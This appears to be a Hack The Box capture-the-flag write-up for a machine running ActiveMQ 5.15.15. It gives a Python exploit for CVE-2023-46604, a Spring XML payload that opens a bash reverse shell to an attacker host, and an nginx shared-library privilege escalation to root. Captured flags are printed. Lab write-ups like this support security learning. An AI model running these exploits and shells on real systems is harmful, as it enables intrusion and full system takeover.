**Date:** 2026-05-15

**Difficulty:** Easy

**Tags:** #linux #htb #ctf #activemq #rce #nginx #privesc

---

## 1. Enumeration

### Initial Nmap Scan

We begin by performing a standard service and OS detection scan to identify open ports and running services.

Bash

```bash
sudo nmap -sV -sC -O 10.129.230.87
```

**Results:**

- **Port 22:** SSH (OpenSSH 8.9p1)
- **Port 80:** HTTP (nginx 1.18.0) - Returns `401 Unauthorized`.

### Web Exploration

Accessing the web server on port 80 reveals an authentication panel. Testing default credentials allows us to bypass the prompt:

- **Username:** `admin`
- **Password:** `admin`

Once inside the **ActiveMQ** panel, we identify the version: **5.15.15**.

![[Broker1.png]]


> **CAUTION**
>
> ActiveMQ version **5.15.15** is vulnerable to **CVE-2023-46604** (Remote Code Execution).

### Full Port Enumeration

To exploit this vulnerability, we need to locate the broker service. We run a full port scan to find the OpenWire transport port.

```bash
sudo nmap -p- -sCV --min-rate 5000 10.129.230.87
```

**Key Discovery:**

- **Port 61616:** `apachemq ActiveMQ OpenWire transport 5.15.15`

---

## 2. Exploitation (RCE)

The vulnerability [CVE-2023-46604](https://github.com/evkl1d/CVE-2023-46604) allows for RCE by manipulating serialized class types in the OpenWire protocol.
**Source Exploit:** [evkl1d/CVE-2023-46604](https://github.com/evkl1d/CVE-2023-46604)
### Preparation

We need two files: a Python exploit script and a malicious XML configuration.

**1. Exploit Script (`exploit.py`):**



```python
import socket 
import argparse 
 
def main(ip, port, url): 
    if not ip or not url: 
        print("Usage: script.py -i <ip> -p <port> -u <url>") 
        return 
    
    class_name = "org.springframework.context.support.ClassPathXmlApplicationContext" 
    message = url 
    header = "1f00000000000000000001" 
    body = header + "01" + int2hex(len(class_name), 4) + string2hex(class_name) + "01" + int2hex(len(message), 4) + string2hex(message) 
    payload = int2hex(len(body) // 2, 8) + body 
    data = bytes.fromhex(payload) 
 
    conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    conn.connect((ip, int(port))) 
    conn.send(data) 
    conn.close() 

# ... (Helper functions string2hex and int2hex)
```

**2. Malicious XML (`poc.xml`):**

This file tells the server to execute a bash reverse shell.

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
        <constructor-arg>
        <list>
            <value>bash</value>
            <value>-c</value>
            <value>bash -i >& /dev/tcp/10.10.15.190/4445 0>&1</value>
        </list>
        </constructor-arg>
    </bean>
</beans>
```

### Execution

1. **Start HTTP Server:** `python3 -m http.server 8000`

2. **Start Netcat Listener:** `nc -nlvp 4445`

3. **Run Exploit:**

```bash
python3 exploit.py -i 10.129.230.87 -p 61616 -u http://10.10.15.190:8000/poc.xml
```

**User Flag:** `d552e4e2fe78b675fe771c393902dc54`

---

## 3. Privilege Escalation

### Enumeration

Checking sudo privileges for the `activemq` user:

```Bash
activemq@broker:~$ sudo -l
Matching Defaults entries for activemq on broker:
    ...
User activemq may run the following commands on broker:
    (ALL : ALL) NOPASSWD: /usr/sbin/nginx
```

### Nginx Library Load Exploit

According to **GTFOBins**, we can escalate privileges by loading a malicious module.

![[Broker2.png]]

**Step 1: Compile the Malicious Library**

We create a C library that executes a shell upon being loaded.

```Bash
echo '__attribute__((constructor)) void init() { setuid(0); setgid(0); execl("/bin/sh", "sh", 0); }' | gcc -w -fPIC -shared -o /tmp/exploit.so -x c -
```

**Step 2: Create a Custom Nginx Config**

```Bash
echo "load_module /tmp/exploit.so;" > /tmp/pwn.conf
```

**Step 3: Execute with Sudo**

```Bash
sudo /usr/sbin/nginx -c /tmp/pwn.conf
```

### Root Access

The process immediately grants a root shell:

```Bash
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
21e6a1de25e8b4c1d51ce4eba5693e27
```
